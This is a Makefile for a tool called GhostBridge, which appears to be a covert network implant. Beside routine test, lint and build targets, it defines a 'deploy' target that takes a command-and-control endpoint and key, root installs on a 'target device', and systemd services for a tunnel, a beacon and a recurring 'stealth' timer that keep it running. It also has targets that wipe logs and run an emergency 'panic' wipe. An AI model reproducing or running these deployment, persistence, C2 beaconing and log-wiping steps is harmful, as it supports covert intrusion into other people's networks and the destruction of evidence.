# GhostBridge Makefile
# Common development tasks

.PHONY: help install install-dev test lint format clean build deploy

PYTHON := python3
PIP := pip3
VENV := .venv
VERSION := 0.5.0

# Colors
GREEN := \033[0;32m
YELLOW := \033[1;33m
NC := \033[0m

help:  ## Show this help
	@echo "$(GREEN)GhostBridge v$(VERSION) - Development Tasks$(NC)"
	@echo ""
	@grep -E '^[a-zA-Z_-]+:.*?## .*$$' $(MAKEFILE_LIST) | sort | awk 'BEGIN {FS = ":.*?## "}; {printf "  $(GREEN)%-20s$(NC) %s\n", $$1, $$2}'

# ===== Development =====

venv:  ## Create virtual environment
	$(PYTHON) -m venv $(VENV)
	@echo "Activate with: source $(VENV)/bin/activate"

install:  ## Install package
	$(PIP) install -e .

install-dev:  ## Install with dev dependencies
	$(PIP) install -e ".[dev]"

# ===== Testing =====

test:  ## Run tests
	pytest tests/ -v

test-cov:  ## Run tests with coverage
	pytest tests/ -v --cov=ghostbridge --cov-report=term-missing --cov-report=html

test-quick:  ## Quick test run
	pytest tests/ -v --tb=short -q

# ===== Code Quality =====

lint:  ## Run linters
	ruff check src/ tests/
	mypy src/ghostbridge/

format:  ## Format code
	black src/ tests/
	isort src/ tests/

format-check:  ## Check formatting
	black --check src/ tests/
	isort --check-only src/ tests/

# ===== Build =====

clean:  ## Clean build artifacts
	rm -rf build/
	rm -rf dist/
	rm -rf *.egg-info/
	rm -rf src/*.egg-info/
	rm -rf .pytest_cache/
	rm -rf htmlcov/
	rm -rf .coverage
	rm -rf .mypy_cache/
	rm -rf .ruff_cache/
	find . -type d -name __pycache__ -exec rm -rf {} + 2>/dev/null || true

build:  ## Build package
	$(PYTHON) -m build

# ===== CLI Commands =====

run:  ## Run full GhostBridge system
	ghostbridge run

run-bridge:  ## Run bridge only
	ghostbridge start

status:  ## Show system status
	ghostbridge status

health:  ## Run health check
	ghostbridge health

tunnel-status:  ## Show tunnel status
	ghostbridge tunnel status

stealth-wipe:  ## Wipe logs
	ghostbridge stealth wipe

config:  ## Generate example config
	ghostbridge config generate -o config.yml

self-test:  ## Run self-tests
	ghostbridge test

# ===== Deployment =====

deploy-install:  ## Install on target device (requires root)
	sudo bash scripts/install.sh

deploy:  ## Quick deploy (requires C2_ENDPOINT and C2_PUBKEY env vars)
	@if [ -z "$(C2_ENDPOINT)" ] || [ -z "$(C2_PUBKEY)" ]; then \
		echo "Usage: make deploy C2_ENDPOINT=host:port C2_PUBKEY=pubkey"; \
		exit 1; \
	fi
	sudo bash scripts/deploy.sh "$(C2_ENDPOINT)" "$(C2_PUBKEY)"

# ===== Bridge Scripts (Linux only) =====

setup-bridge:  ## Setup bridge (requires root)
	sudo bash scripts/setup-bridge.sh

teardown-bridge:  ## Teardown bridge (requires root)
	sudo bash scripts/teardown-bridge.sh

panic:  ## Emergency wipe (DANGER!)
	sudo /usr/local/bin/ghostbridge-panic

# ===== Services =====

services-install:  ## Install systemd services
	sudo cp services/*.service /etc/systemd/system/
	sudo cp services/*.timer /etc/systemd/system/
	sudo systemctl daemon-reload

services-enable:  ## Enable all services
	sudo systemctl enable ghostbridge ghostbridge-tunnel ghostbridge-beacon
	sudo systemctl enable ghostbridge-stealth.timer

services-start:  ## Start all services
	sudo systemctl start ghostbridge
	sudo systemctl start ghostbridge-tunnel
	sudo systemctl start ghostbridge-beacon
	sudo systemctl start ghostbridge-stealth.timer

services-stop:  ## Stop all services
	sudo systemctl stop ghostbridge-beacon
	sudo systemctl stop ghostbridge-tunnel
	sudo systemctl stop ghostbridge
	sudo systemctl stop ghostbridge-stealth.timer

services-status:  ## Show services status
	@systemctl status ghostbridge ghostbridge-tunnel ghostbridge-beacon --no-pager || true

# ===== Logs =====

logs:  ## Show recent logs
	@journalctl -u ghostbridge -u ghostbridge-tunnel -u ghostbridge-beacon -n 50 --no-pager

logs-follow:  ## Follow logs
	@journalctl -u ghostbridge -u ghostbridge-tunnel -u ghostbridge-beacon -f

